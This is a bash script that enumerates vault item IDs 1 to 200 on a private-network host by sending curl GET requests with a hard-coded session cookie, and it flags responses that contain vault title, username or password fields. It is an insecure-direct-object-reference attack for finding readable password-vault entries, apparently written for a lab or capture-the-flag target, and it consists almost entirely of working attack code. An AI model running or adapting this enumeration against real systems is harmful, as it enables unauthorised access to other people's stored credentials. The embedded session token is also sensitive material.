#!/bin/bash

# Enhanced enumeration script to find existing vault item IDs
# Uses GET requests to read items without modifying them

echo "Enumerating vault item IDs using GET requests..."
echo "This will attempt to read each item ID and check for valid responses"
echo ""

for id in {1..200}; do
  echo -n "Testing ID: $id - "

  # Try GET request to read the item
  response=$(curl -s -w "%{http_code}" \
    -X GET "http://10.0.0.10/vault/edit/$id" \
    -H "Cookie: connect.sid=s%3AoJ5g5Gk6fvmfemhAviLKS-521lOrK8af.ln45ExmnMcmhS0AznQaRhb7lxiyxxpcQD%2B78Nsrsy%2FI" \
    -H "Content-Type: application/json")

  # Extract HTTP status code (last 3 characters)
  http_code="${response: -3}"

  if [ "$http_code" = "200" ]; then
    # Check if response contains item data (not just error)
    if echo "$response" | grep -q '"vaulttitle"\|"vaultusername"\|"vaultpassword"'; then
      echo "VALID ITEM FOUND"
      # Optional: Show item details (remove comment to enable)
      # echo "$response" | head -n 5
    else
      echo "Not found or no access"
    fi
  else
    echo "HTTP $http_code"
  fi
done

echo ""
echo "Enumeration complete. Valid items are those marked 'VALID ITEM FOUND'"
